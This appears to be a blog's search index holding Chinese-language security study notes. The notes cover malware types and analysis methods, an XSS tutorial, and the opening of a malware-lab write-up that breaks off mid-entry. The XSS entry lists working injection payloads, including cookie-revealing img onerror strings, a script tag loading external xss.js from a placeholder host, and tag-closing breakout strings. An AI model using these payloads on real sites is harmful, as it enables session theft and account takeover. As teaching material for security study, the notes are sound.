<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>恶意代码</title>
    <link href="/2022/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    <url>/2022/11/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-恶意代码定义"><a href="#1-恶意代码定义" class="headerlink" title="1. 恶意代码定义"></a>1. 恶意代码定义</h2><p><strong>malware</strong> is <strong>a set of instructions</strong> that run on your computer and make your system do something that <strong>an attacker wants it to do</strong>.</p><p>指令集合：二进制执行文件、脚本语言代码、宏代码、寄生在文件和启动扇区的指令流。</p><h2 id="2-恶意代码类型"><a href="#2-恶意代码类型" class="headerlink" title="2. 恶意代码类型"></a>2. 恶意代码类型</h2><h3 id="计算机病毒（Virus）"><a href="#计算机病毒（Virus）" class="headerlink" title="计算机病毒（Virus）"></a>计算机病毒（Virus）</h3><p>通过感染文件（可执行文件、数据文件、电子邮件…）或磁盘引导扇区进行传播，一般需要宿主程序被执行或人为交互才能运行。<br>e.g. Brain  Concept  CIH  勒索软件</p><h3 id="蠕虫（Worm）"><a href="#蠕虫（Worm）" class="headerlink" title="蠕虫（Worm）"></a>蠕虫（Worm）</h3><p>一般不需要宿主的单独文件，通过网络传播，自动复制，通常无需认为交互便可感染传播。<br>e.g. Morris  CodeRed  Slammer</p><h3 id="启动器（Downloader）"><a href="#启动器（Downloader）" class="headerlink" title="启动器（Downloader）"></a>启动器（Downloader）</h3><p>从远程主机下载到本地执行的轻量级恶意代码，不需要或仅需要极少的人为干预。代表性的开发工具由：JavaScript  VBScript  ActiveX  启动其他恶意程序的恶意代码<br>e.g. SantyWorm</p><h3 id="后门（Backdoor）"><a href="#后门（Backdoor）" class="headerlink" title="后门（Backdoor）"></a>后门（Backdoor）</h3><p>绕过正常的安全控制机制，从而为攻击者提供访问途径。<br>e.g. Netcat  BO  冰河  Glupteba</p><h3 id="特洛伊木马（Trojan）"><a href="#特洛伊木马（Trojan）" class="headerlink" title="特洛伊木马（Trojan）"></a>特洛伊木马（Trojan）</h3><p>伪装成有用软件，隐藏其恶意目标，欺骗用户安装执行。<br>e.g. Setiri  Emotet  Dridex  Ramnit</p><h3 id="僵尸程序（Bot）"><a href="#僵尸程序（Bot）" class="headerlink" title="僵尸程序（Bot）"></a>僵尸程序（Bot）</h3><p>一般不需要宿主的单独文件，通过网络传播，自动复制，通常无需人为交互便可感染传播，使用一对多的命令与控制机组成僵尸网络。<br>e.g. Sdbot  Agobot  Mirai  Glupteba</p><h3 id="内核套件（Rootkit）"><a href="#内核套件（Rootkit）" class="headerlink" title="内核套件（Rootkit）"></a>内核套件（Rootkit）</h3><p>通过替换或修改系统关键可执行文件（用户态），或者通过控制OS内核（内核态），用以获取并保持最高控制权（root access）<br>e.g. LRK FU hdef</p><h3 id="融合型恶意代码及Bootkit（固件感染）"><a href="#融合型恶意代码及Bootkit（固件感染）" class="headerlink" title="融合型恶意代码及Bootkit（固件感染）"></a>融合型恶意代码及Bootkit（固件感染）</h3><p>融合上述多种恶意代码技术，构成更具破坏性的恶意代码形态，如Bootkit<br>e.g. Nimda  Stuxnet  Flame  Duqu</p><h2 id="3-恶意代码分析方法"><a href="#3-恶意代码分析方法" class="headerlink" title="3. 恶意代码分析方法"></a>3. 恶意代码分析方法</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>通过<strong>反病毒引擎</strong>扫描识别已知的恶意代码家族和变种名；<br>逆向分析恶意代码模块构成，内部数据结构，关键控制流程等，理解恶意代码的机理，并提取特征码用于检测；</p><ul><li>恶意代码扫描：标识已知恶意代码（反病毒引擎、VirusTotal）</li><li>文件格式识别：确定攻击平台和类型（file, peid, FileAnalyze）</li><li>字符串提取：寻找恶意代码分析线索（strings）</li><li>二进制结构分析：初步了解二进制文件结构（binutils）</li><li>反汇编：二进制代码-&gt;汇编代码（IDAPro, GDB, VC）</li><li>反编译：汇编代码-&gt;高级语言（REC, DCC, JAD）</li><li>代码结构与逻辑分析：分析二进制代码组，理解二进制代码逻辑结构（IDAPro, Ollydbg）</li><li>加壳结构和代码脱壳：识别是否加壳及类型；对抗代码混淆恢复原始代码（UPX, VMUnpacker，手工）</li></ul><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>通过受控环境中执行目标代码，以获取目标代码的行为及运行结果；</p><ul><li>快照对比：获取恶意代码行为结果（FileSnap, RegSnap, 完美卸载）</li><li>动态行为监控：实时监控恶意代码动态行为轨迹（Filemon, Regmon, ProcessExploer, Isof）</li><li>网络监控：分析恶意代码网络监听端口及发起网络会话（Fport, Isof, TDImon, ifconfig, tcpdump）</li><li>沙盒：在受控环境下进行完整的恶意代码动态行为监控和分析（NormanSandbox, CWSandbox, FVMSandbox）</li><li>动态跟踪调试：单步调试恶意代码程序，理解程序结构和逻辑（Ollydbg, IDAPro, gdb, softICE, systrace）</li></ul><h2 id="4-恶意代码分析目标"><a href="#4-恶意代码分析目标" class="headerlink" title="4. 恶意代码分析目标"></a>4. 恶意代码分析目标</h2><p>为网络入侵事件的响应提供所需信息；<br>确定到底发生了什么；<br>确保定位出所有受感染的主机和文件；<br>确定恶意代码可以做什么；<br>分析出主机特征和网络特征，以便检测；</p><h1 id="二、静态分析基础技术"><a href="#二、静态分析基础技术" class="headerlink" title="二、静态分析基础技术"></a>二、静态分析基础技术</h1><h2 id="1-恶意代码的扫描"><a href="#1-恶意代码的扫描" class="headerlink" title="1. 恶意代码的扫描"></a>1. 恶意代码的扫描</h2><p>使用反病毒软件进行检测；<br>开源恶意代码扫描引擎ClamAV；<br>从反病毒厂商获得已知恶意代码的分析报告和结果；</p><h2 id="2-哈希值：恶意代码的指纹"><a href="#2-哈希值：恶意代码的指纹" class="headerlink" title="2. 哈希值：恶意代码的指纹"></a>2. 哈希值：恶意代码的指纹</h2><p>将哈希值作为标签使用；<br>与其他分析师分享哈希值，以帮助他们来识别恶意代码；<br>在线搜索这段哈希值，查看这个文件是否已被识别；<br>（MD5算法不再被用于任何软件完整性检查或代码签名）</p><h2 id="3-查找字符串"><a href="#3-查找字符串" class="headerlink" title="3. 查找字符串"></a>3. 查找字符串</h2><p>可能获得的有用信息：<br>恶意代码实例名<br>帮助或命令行选项<br>用户会话<br>后门口令<br>相关URL信息、EMAIL地址<br>库、函数调用</p><h2 id="4-加壳和混淆恶意代码"><a href="#4-加壳和混淆恶意代码" class="headerlink" title="4. 加壳和混淆恶意代码"></a>4. 加壳和混淆恶意代码</h2><p>可执行程序源文件（字符串列表与其他信息是可见的）；<br>脱壳器程序 + 加壳后可执行程序（字符串列表与其他信息都不可见）；</p><p><strong>壳</strong>出于程序作者想对程序资源<strong>压缩</strong>、注册<strong>保护</strong>的目的，把壳主要分为<strong>压缩壳、加密壳</strong>；</p><ul><li>压缩壳：减小程序体积对资源进行压缩（RAR ZIP 7Z FSG ASPack UPX 北斗）</li><li>加密壳：保护壳、猛壳，对程序输入表等内容进行加密保护，具有良好的保护效果（ASPORTECT ACPROTECT PELock 幻影 VMProtect）</li></ul><h2 id="5-PE文件格式"><a href="#5-PE文件格式" class="headerlink" title="5. PE文件格式"></a>5. PE文件格式</h2><p>PE（Portable Execute）文件是Windows下可执行文件的总成，常见的有DLL EXE OCX SYS；<br>PE是指32位可执行文件，64位可执行文件是PE+或PE32+；<br>PE文件以一个文件头开始，其中包括代码信息、应用程序类型、所需的库函数和空间要求</p><h2 id="6-链接库和函数"><a href="#6-链接库和函数" class="headerlink" title="6. 链接库和函数"></a>6. 链接库和函数</h2><p>导入函数（引入函数）：被该模块调用，但它不在该模块中，调用模块中只包含该函数的一些信息（函数名和其所在的模块（链接库）名等）；</p><p>导入表：导入函数相关信息都保存在PE文件中的导入表中，要找到PE文件的导入表，必须先找到data directory即数据目录；</p><p><strong>静态链接</strong><br>在生成可执行程序时，就把库中的内容加入到程序中，在<strong>程序运行前</strong>，先将其目标模块及它们所需的库函数，链接成一个完整的装配模块，以后不再拆开的链接方式；</p><p><strong>动态链接</strong><br>用户源程序编译后得到一组目标模块，在装入内存时采用<strong>边装入边链接</strong>。装入一个目标模块时，若发生一个外部模块调用，将引起装入程序去找出相应的外部目标模块，并将它装入内存，还要修改目标模块中的相对地址；</p><p><strong>运行时链接</strong><br>有些目标模块的链接，推迟到<strong>执行时</strong>才进行，即在执行过程中，若发现一个被调用模块尚未装入内存时，由OS去找到该模块，将它装入内存，并把它连接到调用者模块上，对某些目标模块的链接，是在程序执行中需要该目标模块时，才对它进行的链接；</p><p><strong>导入函数</strong><br>PE文件头包含可执行文件使用的特定函数相关信息；<br>导入函数描述可执行文件会使用哪些Windows API函数，也就是可能会有什么样的操作；</p><p><strong>导出函数</strong><br>用来与其他程序和代码进行交互时所使用的；<br>一个DLL会出现一个或多个功能函数，然后将其导出，供别的程序导入并使用；</p><h2 id="7-PE文件头与节"><a href="#7-PE文件头与节" class="headerlink" title="7. PE文件头与节"></a>7. PE文件头与节</h2><p>PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件（可能是间接被执行，如DLL）</p><p><strong>.text</strong><br>包含CPU执行指令，所有其他节存储数据和支持性的信息，一般来说这是唯一可以执行的节，也是唯一包含代码的节；</p><p><strong>.rdata</strong><br>包含导入与导出函数信息，还可以存储程序所使用的其他制度数据</p><p><strong>.data</strong><br>包含程序的全局数据，可以从程序的任何地方访问到。本地数据并不存储在这个节，而是在PE文件的某个其他位置上；</p><p><strong>.rsrc</strong><br>包含由可执行文件所使用的资源，不能执行，如图标、图片、菜单项、字符串等，字符串也可以存储在主程序中，存放在这是为提供多语种支持；</p>]]></content>
    
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2022/11/08/XSS/"/>
    <url>/2022/11/08/XSS/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01：XSS-原理"><a href="#0x01：XSS-原理" class="headerlink" title="0x01：XSS 原理"></a>0x01：XSS 原理</h1><p>跨站脚本攻击XSS(Cross Site Scripting)<br>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、 LiveScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于<strong>更高的权限</strong>（如执行一些操作）、<strong>私密网页内容</strong>、<strong>会话</strong>和<strong>cookie</strong>等各种内容。</p><h1 id="0x02：XSS类型"><a href="#0x02：XSS类型" class="headerlink" title="0x02：XSS类型"></a>0x02：XSS类型</h1><h2 id="1-存储型"><a href="#1-存储型" class="headerlink" title="1.存储型"></a>1.存储型</h2><p><strong>持久化</strong>，代码是存储在<strong>服务器</strong>中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。<br>这种XSS比较危险，容易造成蠕虫，盗窃cookie。</p><p><img src="/2022/11/08/XSS/a5daba88db174a22a5938474a5f48431.png" alt="在这里插入图片描述"></p><h2 id="2-反射型"><a href="#2-反射型" class="headerlink" title="2.反射型"></a>2.反射型</h2><p><strong>非持久化</strong>，需要欺骗用户自己去<strong>点击链接</strong>才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在<strong>搜索页面</strong>。<br>反射型XSS大多数是用来盗取用户的Cookie信息。<br><img src="/2022/11/08/XSS/70099b67949340a0b1ab4cbe9e8d8887.png" alt="在这里插入图片描述"></p><h2 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3.DOM型"></a>3.DOM型</h2><p>不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过<strong>url传入参数</strong>去控制触发的，其实也属于反射型XSS。</p><p>可能触发DOM型XSS的属性:</p><ul><li>document.referer</li><li>window.name</li><li>location</li><li>innerHTML</li><li>documen.write</li></ul><h1 id="0x03：XSS攻击载荷"><a href="#0x03：XSS攻击载荷" class="headerlink" title="0x03：XSS攻击载荷"></a>0x03：XSS攻击载荷</h1><h2 id="lt-script-gt"><a href="#lt-script-gt" class="headerlink" title="&lt;script&gt;"></a><code>&lt;script&gt;</code></h2><p><code>&lt;script&gt;</code>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)&lt;/script&gt;   #弹出hack<br>&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)&lt;/script&gt;   #弹出hack<br>&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;        #弹出<span class="hljs-number">1</span>，对于数字可以不用引号<br>&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&lt;/script&gt;      #弹出cookie<br>&lt;script src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br></code></pre></td></tr></table></figure><h2 id="lt-svg-gt"><a href="#lt-svg-gt" class="headerlink" title="&lt;svg&gt;"></a><code>&lt;svg&gt;</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;svg onload=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>//</span></span><br></code></pre></td></tr></table></figure><h2 id="lt-img-gt"><a href="#lt-img-gt" class="headerlink" title="&lt;img&gt;"></a><code>&lt;img&gt;</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;img  src=<span class="hljs-number">1</span>  οnerrοr=<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)&gt;<br>&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie<br>&lt;img src=javascript:alert(&#x27;XSS&#x27;)&gt;<br>&lt;img src=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;<br><br></code></pre></td></tr></table></figure><h2 id="lt-body-gt"><a href="#lt-body-gt" class="headerlink" title="&lt;body&gt;"></a><code>&lt;body&gt;</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;body οnlοad=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnpageshοw</span>=<span class="hljs-string">alert(1)</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="lt-video-gt"><a href="#lt-video-gt" class="headerlink" title="&lt;video&gt;"></a><code>&lt;video&gt;</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;video οnlοadstart=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>) src=<span class="hljs-string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><h2 id="lt-style-gt"><a href="#lt-style-gt" class="headerlink" title="&lt;style&gt;"></a><code>&lt;style&gt;</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;style οnlοad=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure><h1 id="0x05：XSS插入位置"><a href="#0x05：XSS插入位置" class="headerlink" title="0x05：XSS插入位置"></a>0x05：XSS插入位置</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript">#用户输入作为<span class="hljs-variable constant_">HTML</span>注释内容，导致攻击者可以进行闭合绕过<br>&lt;!-- 用户输入 --&gt;<br>&lt;!-- --&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>&lt;!-- --&gt;<br><br>#用户输入作为标签属性名，导致攻击者可以进行闭合绕过<br>&lt;div 用户输入=<span class="hljs-string">&quot;xx&quot;</span>&gt;  &lt;/div&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">a</span>=<span class="hljs-string">&quot;xx&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br>#用户输入作为标签属性值，导致攻击者可以进行闭合绕过<br>&lt;div id=<span class="hljs-string">&quot;用户输入&quot;</span>&gt;&lt;/div&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">a</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br>#用户输入作为标签名，导致攻击者可以进行闭合绕过<br>&lt;用户输入  id=<span class="hljs-string">&quot;xx&quot;</span> /&gt;<br>&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;<br><br>#用户输入作为CSS内容，导致攻击者可以进行闭合绕过<br>&lt;style&gt;用户输入&lt;style&gt;<br>&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;<br></code></pre></td></tr></table></figure><h1 id="0x06-XSS漏洞的挖掘"><a href="#0x06-XSS漏洞的挖掘" class="headerlink" title="0x06: XSS漏洞的挖掘"></a>0x06: XSS漏洞的挖掘</h1><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p><ul><li>URL的每一个参数</li><li>URL本身</li><li>表单</li><li>搜索框</li></ul><p>常见业务场景</p><ul><li>重灾区：评论区、留言区、个人信息、订单信息等</li><li>针对型：站内信、网页即时通讯、私信、意见反馈</li><li>存在风险：搜索框、当前目录、图片属性等</li></ul><h2 id="白盒测试（代码审计）"><a href="#白盒测试（代码审计）" class="headerlink" title="白盒测试（代码审计）"></a>白盒测试（代码审计）</h2><p>关于XSS的代码审计主要就是从<strong>接收参数</strong>的地方和一些<strong>关键词</strong>入手。</p><p><strong>PHP中</strong>常见的接收参数的方式有<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了<strong>过滤</strong>和<strong>html编码</strong>等处理。</p><p>也可以搜索类似<code>echo</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p><p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些<strong>公共函数</strong>看有没有过滤，能否绕过等等。</p><p>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</p><h1 id="0x07-XSS攻击过程"><a href="#0x07-XSS攻击过程" class="headerlink" title="0x07: XSS攻击过程"></a>0x07: XSS攻击过程</h1><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><ol><li>Bob拥有一个Web站点，该站点允许用户发布信息&#x2F;浏览已发布的信息。 </li><li>Tom检测到Bob的站点存在存储型的XSS漏洞。</li><li>Tom在Bob的网站上发布一个带有恶意脚本的热点信息，该热点信息存储在了Bob的服务器的数据库中，然后吸引其它用户来阅读该热点信息。</li><li>Bob或者是任何的其他人如Alice浏览该信息之后,Tom的恶意脚本就会执行。</li><li>Tom的恶意脚本执行后，Tom就可以对浏览器该页面的用户发动一起XSS攻击</li></ol><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><ol><li>Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点需要Alice使用用户名&#x2F;密码进行登录，并存储了Alice敏感信息(比如银行帐户信息)。</li><li>Tom 发现 Bob的站点存在反射性的XSS漏洞 </li><li>Tom利用Bob网站的反射型XSS漏洞编写了一个exp，做成链接的形式，并利用各种手段诱使Alice点击</li><li>Alice在登录到Bob的站点后，浏览了 Tom 提供的恶意链接</li><li>嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在Alice完全不知情的情况下将这些信息发送给Tom。 </li><li>Tom 利用获取到的cookie就可以以Alice的身份登录Bob的站点，如果脚本的功更强大的话，Tom还可以对Alice的浏览器做控制并进一步利用漏洞控制</li></ol><h1 id="0x08-XSS漏洞的危害"><a href="#0x08-XSS漏洞的危害" class="headerlink" title="0x08: XSS漏洞的危害"></a>0x08: XSS漏洞的危害</h1><p>存储型的XSS危害最大。因为他存储在服务器端，所以不需要我们和被攻击者有任何接触，只要被攻击者访问了该页面就会遭受攻击。<br>反射型和DOM型的XSS则需要我们去诱使用户点击我们构造的恶意的URL，需要我们和用户有直接或者间接的接触，比如利用社会工程学或者利用在其他网页挂马的方式。<br><img src="/2022/11/08/XSS/581a17bc980845dea8b61091a3428b19.png" alt="在这里插入图片描述"></p><h1 id><a href="#" class="headerlink" title></a></h1><blockquote><p><a href="https://juejin.cn/post/6912030758404259854">https://juejin.cn/post/6912030758404259854</a><br><a href="https://www.cnblogs.com/csnd/p/11807592.html">https://www.cnblogs.com/csnd/p/11807592.html</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战 Lab3_3</title>
    <link href="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/"/>
    <url>/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/</url>
    
    <content type="html"><![CDATA[<h2 id="一、-概述"><a href="#一、-概述" class="headerlink" title="一、 概述"></a>一、 概述</h2><p>实验环境： Windows xp Professional</p><h3 id="1-样本分析登记表"><a href="#1-样本分析登记表" class="headerlink" title="1. 样本分析登记表"></a>1. 样本分析登记表</h3><table><thead><tr><th>样本名称</th><th>样本日期</th><th>大小（Bytes）</th><th>样本编号</th><th>样本来源</th></tr></thead><tbody><tr><td>Lab03-03.exe</td><td>2011年4月8日 12:54:59</td><td>53248</td><td>未知</td><td>《恶意代码分析实战》</td></tr></tbody></table><h3 id="2-样本分析结果登记表"><a href="#2-样本分析结果登记表" class="headerlink" title="2. 样本分析结果登记表"></a>2. 样本分析结果登记表</h3><table><thead><tr><th>项目</th><th>属性</th><th>详细描述</th><th>备注</th></tr></thead><tbody><tr><td>自删除</td><td>√</td><td>运行Lab03-03.exe，程序运行结束后自动删除Lab03-03.exe</td><td>-</td></tr><tr><td>启动方式</td><td>double click</td><td>鼠标双击Lab03-03.exe即可启动</td><td>-</td></tr><tr><td>释放文件</td><td>svchost.exe</td><td>Lab03-03.exe运行时产生新的文件svchost.exe</td><td>-</td></tr><tr><td>进程注入</td><td>√</td><td>Lab03-03.exe运行时创建了新进程svchost.exe，是一个没有父进程的“孤儿进程”</td><td>-</td></tr><tr><td>网络连接</td><td>×</td><td>-</td><td>-</td></tr><tr><td>加壳</td><td>×</td><td>Lab03-03.exe未加壳</td><td>-</td></tr></tbody></table><h2 id="二、行为预览"><a href="#二、行为预览" class="headerlink" title="二、行为预览"></a>二、行为预览</h2><h3 id="1-静态分析"><a href="#1-静态分析" class="headerlink" title="1. 静态分析"></a>1. 静态分析</h3><h4 id="1-1-PEiD查看是否加壳"><a href="#1-1-PEiD查看是否加壳" class="headerlink" title="1.1 PEiD查看是否加壳"></a>1.1 PEiD查看是否加壳</h4><p>未加壳：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025142127542.png" alt="image-20221025142127542"></p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025141805999.png" alt="image-20221025141805999"></p><h4 id="1-2-Dependency-Walker查看函数"><a href="#1-2-Dependency-Walker查看函数" class="headerlink" title="1.2 Dependency Walker查看函数"></a>1.2 Dependency Walker查看函数</h4><p>发现有几个函数是对文件创建和进程创建等操作，考虑该进程可以对内存中的文件进行改动：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025143129215.png" alt="image-20221025143129215"></p><h3 id="2-动态分析"><a href="#2-动态分析" class="headerlink" title="2. 动态分析"></a>2. 动态分析</h3><h4 id="2-1-当使用Process-Explorer工具进行监视时，注意到了什么？"><a href="#2-1-当使用Process-Explorer工具进行监视时，注意到了什么？" class="headerlink" title="2.1 当使用Process Explorer工具进行监视时，注意到了什么？"></a>2.1 当使用Process Explorer工具进行监视时，注意到了什么？</h4><h5 id="2-1-1-启动Process-Explorer"><a href="#2-1-1-启动Process-Explorer" class="headerlink" title="2.1.1 启动Process Explorer"></a>2.1.1 启动Process Explorer</h5><p>运行Lab03-03.exe前启动Process Explorer：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025131156258.png" alt="image-20221025131156258"></p><h5 id="2-1-2-第一次运行Lab03-03-exe"><a href="#2-1-2-第一次运行Lab03-03-exe" class="headerlink" title="2.1.2 第一次运行Lab03-03.exe"></a>2.1.2 第一次运行<code>Lab03-03.exe</code></h5><p>发现在<code>explorer.exe</code>下面多了一个异常的<code>svchost.exe</code>，然后<code>Lab03-03.exe</code>自删除，<code>svchost.exe</code>是一个没有父进程的“孤儿进程”：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025131249206.png" alt="image-20221025131249206"></p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025131340703.png" alt="image-20221025131340703"></p><h5 id="2-1-3-第二次运行Lab03-03-exe"><a href="#2-1-3-第二次运行Lab03-03-exe" class="headerlink" title="2.1.3 第二次运行Lab03-03.exe"></a>2.1.3 第二次运行<code>Lab03-03.exe</code></h5><p>又多了一个异常的<code>svchost.exe</code>文件：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025131421952.png" alt="image-20221025131421952"></p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025131454000.png" alt="image-20221025131454000"></p><h5 